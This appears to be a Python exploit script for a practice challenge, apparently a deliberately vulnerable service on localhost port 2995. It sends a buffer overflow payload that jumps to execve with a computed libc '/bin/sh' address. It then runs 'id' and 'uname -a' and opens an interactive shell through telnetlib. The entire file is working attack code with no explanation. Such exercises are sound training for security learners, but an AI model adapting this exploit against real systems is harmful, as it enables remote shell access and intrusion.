import struct
import socket
import telnetlib

host_address = '127.0.0.1'
port = 2995

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host_address, port))

padding = 'a'*510+"\x00"+"aaaabbbbccccddddeeeef"
execve = struct.pack("I", 0x08048c0c)
binsh = struct.pack("I", 1176511 + 0xb7e97000)
exploit = padding + execve + 'aaaa' + binsh + "\x00"*8

s.send(exploit+"\n")
s.send("id\n")
s.send("uname -a\n")
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
